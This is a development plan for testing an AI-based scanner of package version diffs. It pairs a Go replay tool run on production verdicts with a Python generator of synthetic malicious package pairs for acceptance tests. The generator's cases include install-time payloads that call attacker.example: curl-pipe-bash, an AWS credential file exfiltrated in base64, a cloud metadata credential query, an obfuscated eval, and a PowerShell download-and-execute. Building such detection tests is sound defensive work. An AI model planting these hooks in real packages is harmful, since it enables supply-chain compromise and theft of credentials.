# Version-Diff AI Rebuild — Phase 7.5: Pre-rollout validation

> **For agentic workers:** REQUIRED SUB-SKILL: Use cf-powers:subagent-driven-development (recommended) or cf-powers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Empirically validate that the new scanner corrects the 68.8% false-positive rate of the heuristic, and detects synthetic malicious diffs. Replay 100 historical SUSPICIOUS pairs from the production DB through the new scanner and measure how many flip to CLEAN. Run a known-malicious test set and verify all flag SUSPICIOUS.

**Architecture:** This phase is operational, not code-shipping. We write a one-shot `tools/version-diff-replay/` Go program that reads pairs from a production DB dump, fetches the cached artifacts (or downloads from upstream), and calls the bridge directly via gRPC. Results are written to a CSV for human review. No production traffic.

**Tech Stack:** Go (small CLI), the existing `pb.ScannerBridgeClient`, a copy of the production database (read-only).

**Index:** [`plan-index.md`](./2026-04-30-version-diff-ai-rebuild-plan-index.md)

---

## Context for executor

This phase is the gate before Phase 8a (production shadow rollout). If <95% of historical SUSPICIOUS verdicts flip to CLEAN, we know the prompt or extractor still has issues — go back to Phase 5 prompt iteration. If known-malicious cases don't flag, also iterate.

We do NOT touch production traffic. We:

1. Take a read-only snapshot of the production `artifacts` + `artifact_status` + `version_diff_results` tables.
2. Pull the 100 most recent v1.x SUSPICIOUS rows for top FP packages (`system.text.json`, `numpy`, `cffi`, etc.).
3. For each row, fetch both archive blobs from the cache (or upstream if cache evicted them).
4. Spin up the bridge locally with `mode: shadow`-equivalent (a CLI-driven `ScanArtifactDiff` call).
5. Tally verdicts in a CSV.

The known-malicious set is ≤ 20 entries. The plan can either reuse public PyPI advisories (PyPI/`stymie`, npm/`event-stream`, etc., if pre-pulled archives exist) or hand-craft synthetic diffs that exhibit known-bad patterns.

---

### Task 1: Build the replay tool

**Files:**
- Create: `tools/version-diff-replay/main.go`
- Create: `tools/version-diff-replay/README.md`

- [ ] **Step 1: Write the CLI**

Create [tools/version-diff-replay/main.go](../../tools/version-diff-replay/main.go):

```go
// Package main implements a one-shot replay tool for the AI-driven version-diff
// scanner. Given a database connection string and a list of (new_id, old_id)
// pairs, it dials the local scanner-bridge, calls ScanArtifactDiff for each pair,
// and writes results to a CSV. Used in Phase 7.5 of the version-diff rebuild
// before production rollout.
package main

import (
	"context"
	"database/sql"
	"encoding/csv"
	"flag"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	_ "github.com/lib/pq"
	_ "github.com/mattn/go-sqlite3"

	pb "github.com/cloudfieldcz/shieldoo-gate/internal/scanner/guarddog/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
)

func main() {
	var (
		dbURL       = flag.String("db", "", "Database URL (sqlite path or postgres DSN)")
		driver      = flag.String("driver", "sqlite3", "sqlite3 | postgres")
		socket      = flag.String("socket", "/tmp/shieldoo-bridge.sock", "Bridge socket")
		outCSV      = flag.String("out", "replay-results.csv", "Output CSV path")
		limit       = flag.Int("limit", 100, "Max pairs to replay")
		ecosys      = flag.String("ecosystem", "", "Restrict to one ecosystem (optional)")
		concurrency = flag.Int("concurrency", 4, "Parallel scans (caps OpenAI burst; bridge has 64 worker slots)")
		publicOnly  = flag.Bool("public-only", true, "Only replay pairs whose upstream_url is a public registry (PyPI, npm, NuGet, Maven Central, RubyGems). Set to false explicitly to include private-registry packages — REQUIRES OPERATOR CONSENT.")
	)
	flag.Parse()

	if *dbURL == "" {
		log.Fatal("--db is required")
	}

	db, err := sql.Open(*driver, *dbURL)
	if err != nil {
		log.Fatalf("open db: %v", err)
	}
	defer db.Close()

	conn, err := grpc.NewClient("unix://"+*socket, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		log.Fatalf("dial bridge: %v", err)
	}
	defer conn.Close()
	client := pb.NewScannerBridgeClient(conn)

	// Pull SUSPICIOUS pairs. Default: only public registries (privacy/compliance).
	q := `SELECT vdr.artifact_id, vdr.previous_artifact,
	             a_new.ecosystem, a_new.name, a_new.version,
	             a_new.sha256, a_new.storage_path,
	             a_old.version, a_old.sha256, a_old.storage_path
	        FROM version_diff_results vdr
	        JOIN artifacts a_new ON a_new.id = vdr.artifact_id
	        JOIN artifacts a_old ON a_old.id = vdr.previous_artifact
	       WHERE vdr.verdict = 'SUSPICIOUS'`
	args := []any{}
	if *ecosys != "" {
		q += " AND a_new.ecosystem = ?"
		args = append(args, *ecosys)
	}
	if *publicOnly {
		q += ` AND (a_new.upstream_url LIKE 'https://pypi.org/%'
		         OR a_new.upstream_url LIKE 'https://files.pythonhosted.org/%'
		         OR a_new.upstream_url LIKE 'https://registry.npmjs.org/%'
		         OR a_new.upstream_url LIKE 'https://api.nuget.org/%'
		         OR a_new.upstream_url LIKE 'https://repo1.maven.org/%'
		         OR a_new.upstream_url LIKE 'https://repo.maven.apache.org/%'
		         OR a_new.upstream_url LIKE 'https://rubygems.org/%')`
	} else {
		fmt.Fprintln(os.Stderr,
			"WARNING: --public-only=false will send PRIVATE-REGISTRY package contents to Azure OpenAI.")
		fmt.Fprintln(os.Stderr,
			"         Confirm with security/compliance before proceeding. Press Ctrl-C within 10 s to abort.")
		time.Sleep(10 * time.Second)
	}
	q += " ORDER BY vdr.diff_at DESC LIMIT ?"
	args = append(args, *limit)
	q = rebind(q, *driver)

	rows, err := db.Query(q, args...)
	if err != nil {
		log.Fatalf("query: %v", err)
	}
	defer rows.Close()

	out, err := os.Create(*outCSV)
	if err != nil {
		log.Fatalf("create csv: %v", err)
	}
	defer out.Close()
	w := csv.NewWriter(out)
	defer w.Flush()
	_ = w.Write([]string{
		"artifact_id", "previous_artifact", "ecosystem", "name", "new_version", "old_version",
		"new_verdict", "ai_verdict", "ai_confidence", "ai_findings", "ai_explanation", "tokens_used",
		"flipped_to_clean",
	})

	type row struct {
		newID, prevID                                       string
		eco, name, newVer, newSHA, newPath                  string
		oldVer, oldSHA, oldPath                             string
	}
	var pairs []row
	for rows.Next() {
		var r row
		if err := rows.Scan(&r.newID, &r.prevID, &r.eco, &r.name, &r.newVer,
			&r.newSHA, &r.newPath, &r.oldVer, &r.oldSHA, &r.oldPath); err != nil {
			log.Fatalf("scan: %v", err)
		}
		pairs = append(pairs, r)
	}

	// Worker pool to cap OpenAI burst and bridge load.
	type job struct {
		i int
		r row
	}
	jobs := make(chan job, len(pairs))
	for i, r := range pairs {
		jobs <- job{i: i, r: r}
	}
	close(jobs)

	var csvMu sync.Mutex
	var wg sync.WaitGroup
	for w_id := 0; w_id < *concurrency; w_id++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobs {
				r := j.r
				if _, err := os.Stat(r.newPath); err != nil {
					fmt.Fprintf(os.Stderr, "[%d/%d] %s — new artifact not on disk: %v\n", j.i+1, len(pairs), r.newID, err)
					continue
				}
				if _, err := os.Stat(r.oldPath); err != nil {
					fmt.Fprintf(os.Stderr, "[%d/%d] %s — previous artifact not on disk: %v\n", j.i+1, len(pairs), r.prevID, err)
					continue
				}

				ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
				req := &pb.DiffScanRequest{
					ArtifactId:         r.newID,
					Ecosystem:          r.eco,
					Name:               r.name,
					Version:            r.newVer,
					PreviousVersion:    r.oldVer,
					LocalPath:          r.newPath,
					PreviousPath:       r.oldPath,
					LocalPathSha256:    strings.ToLower(r.newSHA),
					PreviousPathSha256: strings.ToLower(r.oldSHA),
				}
				resp, err := client.ScanArtifactDiff(ctx, req)
				cancel()
				if err != nil {
					fmt.Fprintf(os.Stderr, "[%d/%d] %s — bridge error: %v\n", j.i+1, len(pairs), r.newID, err)
					continue
				}

				flipped := "no"
				if resp.Verdict == "CLEAN" {
					flipped = "yes"
				}
				csvMu.Lock()
				_ = w.Write([]string{
					r.newID, r.prevID, r.eco, r.name, r.newVer, r.oldVer,
					"SUSPICIOUS",
					resp.Verdict, fmt.Sprintf("%.4f", resp.Confidence),
					strings.Join(resp.Findings, " | "),
					resp.Explanation,
					fmt.Sprintf("%d", resp.TokensUsed),
					flipped,
				})
				w.Flush()
				csvMu.Unlock()
				fmt.Printf("[%d/%d] %s/%s %s→%s : %s (conf=%.2f)\n",
					j.i+1, len(pairs), r.eco, r.name, r.oldVer, r.newVer, resp.Verdict, resp.Confidence)
			}
		}()
	}
	wg.Wait()
}

func rebind(q, driver string) string {
	if driver != "postgres" {
		return q
	}
	out := strings.Builder{}
	n := 0
	for _, c := range q {
		if c == '?' {
			n++
			fmt.Fprintf(&out, "$%d", n)
			continue
		}
		out.WriteRune(c)
	}
	return out.String()
}

```

- [ ] **Step 2: Write the README**

Create [tools/version-diff-replay/README.md](../../tools/version-diff-replay/README.md):

```markdown
# version-diff-replay

One-shot replay tool used in Phase 7.5 of the version-diff rebuild. Reads
SUSPICIOUS pairs from a database snapshot, calls the local scanner-bridge for
each pair, and writes verdicts to a CSV.

## Usage

```bash
# Take a read-only Postgres dump (production):
ssh shieldoo-gate "pg_dump -t artifacts -t artifact_status -t version_diff_results \
    -h localhost -U shieldoo shieldoo" > /tmp/sg-vdiff.sql

# Restore into a local Postgres / SQLite for analysis (here SQLite for simplicity):
sqlite3 /tmp/replay.db < /tmp/sg-vdiff.sql

# Start the bridge with AI enabled, pointing at your test deployment:
cd scanner-bridge
AI_SCANNER_ENABLED=true \
AI_SCANNER_PROVIDER=azure_openai \
AI_SCANNER_AZURE_ENDPOINT=$Y AI_SCANNER_API_KEY=$X \
BRIDGE_SOCKET=/tmp/replay-bridge.sock \
uv run python main.py &

# Run the replay:
go run ./tools/version-diff-replay \
    --db /tmp/replay.db --driver sqlite3 \
    --socket /tmp/replay-bridge.sock \
    --limit 100 \
    --out replay-results.csv

# Analyse:
awk -F',' 'NR>1 {if ($13=="\"yes\"") flipped++; else stuck++} END {print "flipped:", flipped, "stuck:", stuck}' replay-results.csv
```

## Acceptance criteria

- ≥ 95 of the 100 historical SUSPICIOUS rows must flip to CLEAN.
- The known-malicious test set (separate run) must yield SUSPICIOUS verdicts on
  all entries.

If either fails, iterate on the prompt (`scanner-bridge/prompts/version_diff_analyst.txt`)
and re-run.
```

- [ ] **Step 3: Build the tool**

```bash
go build -o bin/version-diff-replay ./tools/version-diff-replay/
```

Expected: success, `bin/version-diff-replay` exists.

(No commit yet — combined with the malicious test set.)

---

### Task 2: Build the known-malicious test set

**Files:**
- Create: `tools/version-diff-replay/known-malicious/README.md`
- Create: `tools/version-diff-replay/known-malicious/synthesize.py`
- Create: `tools/version-diff-replay/known-malicious/cases.yaml`

- [ ] **Step 1: Write a synthetic-malicious archive generator**

Create [tools/version-diff-replay/known-malicious/synthesize.py](../../tools/version-diff-replay/known-malicious/synthesize.py):

```python
"""Generates synthetic malicious package pairs for version-diff acceptance tests.

Each "case" yields two zip/tarball files representing an old (presumed clean)
version and a new (introduced-malware) version. Cases are intentionally clear
positives — the scanner MUST flag SUSPICIOUS or MALICIOUS for every case.
"""

from __future__ import annotations

import io
import json
import os
import sys
import tarfile
import zipfile
from pathlib import Path

OUT = Path(__file__).parent / "out"
OUT.mkdir(exist_ok=True)


def write_wheel(path: Path, files: dict[str, str]):
    with zipfile.ZipFile(path, "w") as zf:
        for n, c in files.items():
            zf.writestr(n, c)


def write_sdist(path: Path, files: dict[str, str]):
    with tarfile.open(path, "w:gz") as tf:
        for n, c in files.items():
            blob = c.encode()
            info = tarfile.TarInfo(name=n)
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))


def write_npm(path: Path, files: dict[str, str]):
    with tarfile.open(path, "w:gz") as tf:
        for n, c in files.items():
            blob = c.encode()
            info = tarfile.TarInfo(name=f"package/{n}")
            info.size = len(blob)
            tf.addfile(info, io.BytesIO(blob))


CASES = [
    # 1. PyPI: setup.py introduces curl-pipe-sh
    ("pypi-curl-pipe-sh",
     "pypi", "evil-curl", "1.0.0", "1.1.0",
     {"old": ("sdist", {"evil-curl-1.0.0/setup.py": "from setuptools import setup\nsetup(name='evil-curl', version='1.0.0')\n"}),
      "new": ("sdist", {"evil-curl-1.1.0/setup.py": "from setuptools import setup\nimport os\nos.system('curl https://attacker.example/install.sh | bash')\nsetup(name='evil-curl', version='1.1.0')\n"})}),
    # 2. PyPI: .pth file with import-hook
    ("pypi-pth-import-hook",
     "pypi", "evil-pth", "0.5", "0.6",
     {"old": ("wheel", {"evil_pth/__init__.py": "x=1"}),
      "new": ("wheel", {"evil_pth/__init__.py": "x=1", "evil_pth.pth": "import os; os.system('python -c \"import urllib.request as r; r.urlopen(\\\"https://attacker.example/x\\\")\"')"})}),
    # 3. NPM: postinstall changes from echo to evil
    ("npm-postinstall-evil",
     "npm", "evil-npm", "1.0.0", "1.1.0",
     {"old": ("npm", {"package.json": json.dumps({"name": "evil-npm", "version": "1.0.0", "scripts": {"postinstall": "echo ok"}}), "index.js": "module.exports = {};"}),
      "new": ("npm", {"package.json": json.dumps({"name": "evil-npm", "version": "1.1.0", "scripts": {"postinstall": "node -e 'require(\"child_process\").exec(\"curl https://attacker.example | bash\")'"}}), "index.js": "module.exports = {};"})}),
    # 4. PyPI: credential read from ~/.aws
    ("pypi-aws-cred-read",
     "pypi", "evil-aws", "2.0", "2.1",
     {"old": ("sdist", {"evil-aws-2.0/setup.py": "from setuptools import setup; setup()", "evil-aws-2.0/evil_aws/__init__.py": "VERSION='2.0'"}),
      "new": ("sdist", {"evil-aws-2.1/setup.py": "from setuptools import setup\nimport os, urllib.request, base64\nwith open(os.path.expanduser('~/.aws/credentials')) as f:\n    data = base64.b64encode(f.read().encode()).decode()\nurllib.request.urlopen('https://attacker.example/x?d='+data)\nsetup()\n", "evil-aws-2.1/evil_aws/__init__.py": "VERSION='2.1'"})}),
    # 5. PyPI: IMDS query
    ("pypi-imds-query",
     "pypi", "evil-imds", "1.0", "1.1",
     {"old": ("wheel", {"evil_imds/__init__.py": "x=1"}),
      "new": ("wheel", {"evil_imds/__init__.py": "x=1", "evil_imds.pth": "import urllib.request; urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"})}),
    # 6. NPM: base64+exec in install
    ("npm-base64-exec",
     "npm", "evil-b64", "1.0", "1.1",
     {"old": ("npm", {"package.json": json.dumps({"name": "evil-b64", "version": "1.0", "scripts": {"install": "echo ok"}}), "index.js": "module.exports = {};"}),
      "new": ("npm", {"package.json": json.dumps({"name": "evil-b64", "version": "1.1", "scripts": {"install": "node -e \"eval(Buffer.from('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlIHwgYmFzaCcpO0Aw','base64').toString())\""}}), "index.js": "module.exports = {};"})}),
    # 7. NuGet: install.ps1 introduces network call
    ("nuget-install-ps1-network",
     "nuget", "evil-nuget", "1.0", "1.1",
     {"old": ("nupkg", {"tools/install.ps1": "Write-Host 'Installed'", "lib/net6.0/evil.dll": "dummy"}),
      "new": ("nupkg", {"tools/install.ps1": "Invoke-WebRequest -Uri 'https://attacker.example/x.exe' -OutFile $env:TEMP/x.exe; Start-Process $env:TEMP/x.exe", "lib/net6.0/evil.dll": "dummy"})}),
    # 8. RubyGems: extconf.rb spawns subprocess
    ("rubygems-extconf-spawn",
     "rubygems", "evil-gem", "1.0", "1.1",
     {"old": ("gem", {"ext/native/extconf.rb": "require 'mkmf'\ncreate_makefile('evil')\n", "lib/evil.rb": "module Evil; VERSION='1.0'; end"}),
      "new": ("gem", {"ext/native/extconf.rb": "require 'mkmf'\nsystem('curl https://attacker.example/payload.sh | bash')\ncreate_makefile('evil')\n", "lib/evil.rb": "module Evil; VERSION='1.1'; end"})}),
    # 9. PyPI: minor version bump only — must NOT be flagged
    ("pypi-clean-bump",
     "pypi", "clean-bump", "1.0", "1.1",
     {"old": ("wheel", {"clean_bump/__init__.py": "VERSION='1.0'"}),
      "new": ("wheel", {"clean_bump/__init__.py": "VERSION='1.1'"})}),
    # 10. NPM: docs change only — must NOT be flagged
    ("npm-clean-docs",
     "npm", "clean-docs", "1.0", "1.1",
     {"old": ("npm", {"package.json": json.dumps({"name": "clean-docs", "version": "1.0"}), "index.js": "module.exports = {};", "README.md": "# v1.0"}),
      "new": ("npm", {"package.json": json.dumps({"name": "clean-docs", "version": "1.1"}), "index.js": "module.exports = {};", "README.md": "# v1.1\n\nNew section explaining feature X."})}),
]


def write_case(case_id, ecosystem, name, old_ver, new_ver, files):
    case_dir = OUT / case_id
    case_dir.mkdir(exist_ok=True)
    for side, (fmt, fmap) in files.items():
        if fmt == "wheel":
            p = case_dir / f"{side}.whl"
            write_wheel(p, fmap)
        elif fmt == "sdist":
            p = case_dir / f"{side}.tar.gz"
            write_sdist(p, fmap)
        elif fmt == "npm":
            p = case_dir / f"{side}.tgz"
            write_npm(p, fmap)
        elif fmt == "nupkg":
            p = case_dir / f"{side}.nupkg"
            write_wheel(p, fmap)  # nupkg is zip
        elif fmt == "gem":
            p = case_dir / f"{side}.gem"
            inner = io.BytesIO()
            with tarfile.open(fileobj=inner, mode="w:gz") as inner_tf:
                for fn, fc in fmap.items():
                    blob = fc.encode()
                    info = tarfile.TarInfo(name=fn); info.size = len(blob)
                    inner_tf.addfile(info, io.BytesIO(blob))
            inner_blob = inner.getvalue()
            with tarfile.open(p, "w") as outer:
                info = tarfile.TarInfo(name="data.tar.gz"); info.size = len(inner_blob)
                outer.addfile(info, io.BytesIO(inner_blob))
                meta = b'{"name":"' + name.encode() + b'"}'
                info2 = tarfile.TarInfo(name="metadata.gz"); info2.size = len(meta)
                outer.addfile(info2, io.BytesIO(meta))


def main():
    for case_id, eco, name, old_ver, new_ver, files in CASES:
        write_case(case_id, eco, name, old_ver, new_ver, files)
    print(f"Wrote {len(CASES)} cases to {OUT}")
    # Emit a manifest CSV the replay tool can consume.
    manifest = OUT / "cases.csv"
    with manifest.open("w") as f:
        f.write("case_id,ecosystem,name,old_version,new_version,old_path,new_path,expected_verdict\n")
        for case_id, eco, name, old_ver, new_ver, files in CASES:
            old_fmt = files["old"][0]; new_fmt = files["new"][0]
            ext = {"wheel": ".whl", "sdist": ".tar.gz", "npm": ".tgz", "nupkg": ".nupkg", "gem": ".gem"}
            expected = "CLEAN" if "clean" in case_id else "SUSPICIOUS"
            f.write(f"{case_id},{eco},{name},{old_ver},{new_ver},{OUT}/{case_id}/old{ext[old_fmt]},{OUT}/{case_id}/new{ext[new_fmt]},{expected}\n")
    print(f"Wrote manifest {manifest}")


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Write the README**

Create [tools/version-diff-replay/known-malicious/README.md](../../tools/version-diff-replay/known-malicious/README.md):

```markdown
# Known-malicious test set

10 synthetic cases representing classic supply-chain attack patterns. The
new version-diff scanner MUST yield SUSPICIOUS (or MALICIOUS, downgraded to
SUSPICIOUS) for every "evil-*" case and CLEAN for every "clean-*" case.

## Generate

```bash
cd tools/version-diff-replay/known-malicious
uv run python synthesize.py
```

Outputs `out/<case>/old.<ext>` and `new.<ext>` plus `out/cases.csv`.

## Run against a local bridge

```bash
# (Bridge running with AI enabled — see ../README.md)

while IFS=, read -r case_id eco name old_v new_v old_p new_p expected; do
    [ "$case_id" = "case_id" ] && continue   # skip header
    echo "=== $case_id (expect=$expected) ==="
    grpcurl -plaintext -unix /tmp/replay-bridge.sock \
        -d '{
              "artifact_id":"'$eco':'$name':'$new_v'",
              "ecosystem":"'$eco'",
              "name":"'$name'",
              "version":"'$new_v'",
              "previous_version":"'$old_v'",
              "local_path":"'$new_p'",
              "previous_path":"'$old_p'"
            }' \
        scanner.ScannerBridge/ScanArtifactDiff
done < out/cases.csv
```

## Acceptance

- 8 evil-* cases → all `SUSPICIOUS` or `MALICIOUS`.
- 2 clean-* cases → both `CLEAN`.

If anything misclassifies, iterate on the prompt before proceeding.
```

(No commit yet.)

---

### Task 3: Run the validation against production data

This is operational and not committed to git — runs once.

- [ ] **Step 0 (PREREQUISITE): Confirm data-handling consent**

The replay procedure sends file contents from production-cached packages to
Azure OpenAI. Before running:

- Confirm with security/compliance that this batch transfer is permitted.
- Confirm that no contractually private packages will be included.
- The replay tool defaults to `--public-only=true`, which restricts the SQL
  to packages whose `upstream_url` matches a public registry domain (PyPI,
  npm, NuGet, Maven Central, RubyGems). **Do NOT pass `--public-only=false`
  without explicit approval.**

If your gate hosts internal/private artifacts, prefer running the replay
exclusively over the public-only subset. The known-malicious set in Task 2
provides FN coverage independent of the production replay.

- [ ] **Step 1: Snapshot the production tables**

```bash
ssh shieldoo-gate "cd /opt/shieldoo-gate && docker compose exec postgres pg_dump \
    -t artifacts -t artifact_status -t version_diff_results \
    -U shieldoo shieldoo" > /tmp/sg-vdiff-snapshot.sql
```

- [ ] **Step 2: Restore locally to Postgres or SQLite**

```bash
# Postgres locally:
docker run --rm -d --name vdiff-replay -e POSTGRES_USER=shieldoo -e POSTGRES_PASSWORD=x -e POSTGRES_DB=shieldoo -p 55432:5432 postgres:16
sleep 5
psql -h localhost -p 55432 -U shieldoo -d shieldoo < /tmp/sg-vdiff-snapshot.sql
```

- [ ] **Step 3: Run the replay tool**

```bash
go run ./tools/version-diff-replay \
    --db "postgres://shieldoo:x@localhost:55432/shieldoo?sslmode=disable" \
    --driver postgres \
    --socket /tmp/replay-bridge.sock \
    --limit 100 \
    --concurrency 4 \
    --public-only \
    --out /tmp/replay-results.csv
```

Expected: a CSV with 100 rows. The tool prints progress per-row.

- [ ] **Step 4: Tally the flip rate**

```bash
awk -F',' 'NR>1 {if (index($0,",yes,")) flipped++; else stuck++} END {printf "flipped: %d, stuck: %d, flip-rate: %.1f%%\n", flipped, stuck, 100.0*flipped/(flipped+stuck)}' /tmp/replay-results.csv
```

Expected: ≥ 95 % flipped to CLEAN. If lower, examine the "stuck" rows manually:

```bash
awk -F',' 'NR>1 && !index($0,",yes,") {print $4, $5, $7, $9}' /tmp/replay-results.csv | head -20
```

- [ ] **Step 5: Run the known-malicious set**

```bash
cd tools/version-diff-replay/known-malicious
uv run python synthesize.py
bash << 'EOF'
PASS=0; FAIL=0
while IFS=, read -r case_id eco name old_v new_v old_p new_p expected; do
    [ "$case_id" = "case_id" ] && continue
    actual=$(grpcurl -plaintext -unix /tmp/replay-bridge.sock \
        -d '{"artifact_id":"'$eco':'$name':'$new_v'","ecosystem":"'$eco'","name":"'$name'","version":"'$new_v'","previous_version":"'$old_v'","local_path":"'$new_p'","previous_path":"'$old_p'"}' \
        scanner.ScannerBridge/ScanArtifactDiff 2>/dev/null | grep -oE '"verdict":"[^"]+"' | sed 's/.*"\([^"]*\)"$/\1/')
    if [ "$expected" = "CLEAN" ] && [ "$actual" = "CLEAN" ]; then PASS=$((PASS+1)); echo "OK  $case_id (clean)"; \
    elif [ "$expected" = "SUSPICIOUS" ] && { [ "$actual" = "SUSPICIOUS" ] || [ "$actual" = "MALICIOUS" ]; }; then PASS=$((PASS+1)); echo "OK  $case_id ($actual)"; \
    else FAIL=$((FAIL+1)); echo "BAD $case_id expected=$expected actual=$actual"; fi
done < out/cases.csv
echo "pass=$PASS fail=$FAIL"
EOF
```

Expected: `fail=0`.

If anything misclassifies → return to Phase 5 (prompt iteration), then re-run this phase.

- [ ] **Step 6: Commit the tool (not the snapshot data)**

```bash
git add tools/version-diff-replay/main.go \
        tools/version-diff-replay/README.md \
        tools/version-diff-replay/known-malicious/synthesize.py \
        tools/version-diff-replay/known-malicious/README.md
# Do NOT commit /tmp/replay-results.csv or the production snapshot
git commit -m "tools(version-diff): replay tool + known-malicious synthetic test set"
```

---

## Verification — phase-end

```bash
# Tool builds
go build ./tools/version-diff-replay/

# Synthesizer runs
cd tools/version-diff-replay/known-malicious && uv run python synthesize.py

# Validation results (operational — must show ≥ 95 % flip + 0 fail on malicious set)
# (Run results are not committed.)
```

## What this phase ships

- A small Go CLI `tools/version-diff-replay/` that batch-calls the bridge against historical pairs.
- A Python synthesizer that produces 10 deterministic test cases (8 evil, 2 clean).
- A validation report (operational; not committed).

## Risks during this phase

- **Production cache eviction:** if cached artifacts referenced by `version_diff_results` rows have been evicted from disk, the replay tool can't read them. The tool warns and skips those rows; if the skip count is large, fall back to fewer pairs (`--limit 50`).
- **Cost during replay:** 100 LLM calls × ~$0.0017 = ~$0.17. Acceptable.
- **Production-data privacy:** the snapshot includes real package contents that may pass through Azure OpenAI. Run replay only against your own organization's production where appropriate.
- **False FAIL on the known-malicious set:** if synthesizer cases trip on prompt edge cases (e.g., a case is too subtle), tune the case to be unambiguous OR tune the prompt — but **never** loosen the prompt to "pass" the test, that defeats the validation.
